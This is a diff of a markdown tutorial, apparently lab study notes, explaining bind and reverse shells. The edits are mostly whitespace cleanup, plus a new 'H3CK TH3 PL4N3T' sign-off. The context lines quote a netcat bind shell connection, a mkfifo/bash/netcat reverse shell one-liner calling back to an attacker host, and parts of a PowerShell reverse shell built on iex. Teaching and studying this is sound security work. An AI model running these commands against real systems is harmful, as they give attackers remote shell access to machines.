@@ -41,7 +41,7 @@ Now, with the Bind Shell approach, there are a few tricky parts to getting a she
 - The firewalls built into Windows and Linux can block most incoming connections unless they're linked to trusted apps.
 
 Setting up a shell might be tricky because we gotta think about IP addresses, ports, and the tool we're using to make sure our connection works smoothly.
-### Practices with netcat 
+### Practices with netcat
 
 #### No. 1: Server - Target starting Netcat listener
 
@@ -85,7 +85,7 @@ Back on the client, use Netcat to connect to the server now that a shell on the 
 ```shell-session
 nc -nv 10.129.41.200 7777
 
-Target@server:~$  
+Target@server:~$
 ```
 
 We worked through these exercises to understand the basics of the bind shell and how it works without any security controls (NAT-enabled routers, hardware firewalls, Web Application Firewalls, IDS, IPS, OS firewalls, endpoint protection, authentication mechanisms, etc.) in place or exploits needed.
@@ -114,7 +114,7 @@ When it comes to the payloads (commands and code) we use to create these reverse
 
 So, a payload in cybersecurity is basically the bad stuff that hackers use to mess with your system or network. It's like the actual harmful code or data they bring along to achieve their goals, whether that's stealing your info, causing chaos, or damaging things. Knowing about these payloads is super important for both the good guys trying to protect systems and the bad guys planning attacks.
 
-### Types of Payloads 
+### Types of Payloads
 
 1. **Trojan Horses**: These are sneaky programs that pretend to be helpful but actually do nasty stuff like stealing your info or letting bad guys in.
 
@@ -151,7 +151,7 @@ Alright, so the commands above are basically like a one-liner you might hear on 
 #### Remove /tmp/f
 
 ```shell-session
-rm -f /tmp/f; 
+rm -f /tmp/f;
 ```
 
 So, if the `/tmp/f` file is hanging around, we'll just go ahead and delete it with `rm`. And don't worry if it ain't there—the `-f` flag tells `rm` to chill out and not freak out if the file's MIA. Plus, we're using a semi-colon to make sure these commands happen one after the other, like a boss!
@@ -160,7 +160,7 @@ So, if the `/tmp/f` file is hanging around, we'll just go ahead and delete it wi
 
 
 ```shell-session
-mkfifo /tmp/f; 
+mkfifo /tmp/f;
 ```
 
 Creates a FIFO named pipe file at the spot you tell it to. Here, /tmp/f is the named pipe file, and the semicolon (`;`) helps run the command one after the other.
@@ -169,7 +169,7 @@ Creates a FIFO named pipe file at the spot you tell it to. Here, /tmp/f is the n
 
 
 ```shell-session
-cat /tmp/f | 
+cat /tmp/f |
 ```
 
 Joins up the FIFO named pipe file at /tmp/f, and then uses the pipe (`|`) to link the normal output of cat /tmp/f with the normal input of whatever command comes after the pipe (`|`).
@@ -177,7 +177,7 @@ Joins up the FIFO named pipe file at /tmp/f, and then uses the pipe (`|`) to lin
 
 
 ```shell-session
-/bin/bash -i 2>&1 | 
+/bin/bash -i 2>&1 |
 ```
 
 So, you're telling the computer to use this command language interpreter with the `-i` option to make sure it's all interactive. And the `2>&1` part is just redirecting both error messages and regular output to whatever command comes next in the pipeline.
@@ -185,7 +185,7 @@ So, you're telling the computer to use this command language interpreter with th
 
 
 ```shell-session
-nc 10.10.14.12 7777 > /tmp/f  
+nc 10.10.14.12 7777 > /tmp/f
 ```
 
 Alright, let's break it down in simpler terms. We're using Netcat to connect to a host that's set up for our attack, which is `10.10.14.12`, and it's listening on port `7777`. Once we make the connection, the output gets sent to a file in `/tmp` called `f`. This sets up a backdoor Bash shell that our Netcat listener is waiting for. When everything's all set, we run this one-liner command to open the reverse shell.
@@ -206,7 +206,7 @@ Let's break down that huge PowerShell command up there, shall we? It might seem 
 
 
 ```cmd-session
-powershell -nop -c 
+powershell -nop -c
 ```
 
 Alright, so basically, you're using `powershell.exe` without any profile settings (`nop`) and then running a command or script (`-c`) inside the quotes. This whole thing is done from the command prompt, which is why PowerShell starts the command. Knowing this is handy if we find a Remote Code Execution issue that lets us run commands straight in `cmd.exe`.
@@ -231,7 +231,7 @@ Alright, so we're setting this thing called `$stream` to be the same as `$client
 #### Empty Byte Stream
 
 ```cmd-session
-[byte[]]$bytes = 0..65535|%{0}; 
+[byte[]]$bytes = 0..65535|%{0};
 ```
 
 Alright, so we're making a byte array named `$bytes` that's filled with 65,535 zeros. Think of it like a blank slate or an empty pipeline that'll be sent to a listening TCP server on some target machine waiting for a connection.
@@ -257,12 +257,12 @@ Alright, so we're setting this thing called `$data` to this ASCII encoding class
 
 
 ```cmd-session
-$sendback = (iex $data 2>&1 | Out-String ); 
+$sendback = (iex $data 2>&1 | Out-String );
 ```
 
 Alright, let's break it down in simpler terms:
 
-We're setting up a variable called `$sendback`. We're using a command called `Invoke-Expression`, or `iex` for short, to run whatever's inside the `$data` variable on our own computer. 
+We're setting up a variable called `$sendback`. We're using a command called `Invoke-Expression`, or `iex` for short, to run whatever's inside the `$data` variable on our own computer.
 
 Now, when we run this command, it might spit out some error messages and regular output. We don't want those to just pop up on the screen, so we're redirecting them through a pipe (`|`) to another command called `Out-String`. This command takes whatever the `Invoke-Expression` gives us and turns it into plain text strings.
 
@@ -272,7 +272,7 @@ The semi-colon (`;`) at the end is just there to make sure all these commands ar
 
 
 ```cmd-session
-$sendback2 = $sendback + 'PS ' + (pwd).path + '> '; 
+$sendback2 = $sendback + 'PS ' + (pwd).path + '> ';
 ```
 
 Alright, let's break it down. We're setting this thing called `$sendback2` to be equal to `$sendback`, then we're adding the string 'PS', followed by the path to where our program is working right now, and finally, we tack on '> ' to make it look like a shell prompt. So, you'll end up with something like "PS C:\workingdirectoryofmachine >". The semi-colon at the end just makes sure everything runs one after the other. And remember, when we use the '+' sign in this context, it's like gluing strings together, unless we're dealing with numbers in languages like C or C++, where we need a special function for that.
@@ -293,3 +293,6 @@ $client.Close()"
 
 Alright, so this `TcpClient.Close` thing is what we'll use when we need to shut down the connection.
 
+----
+
+H3CK TH3 PL4N3T 😈​💀​☠️​
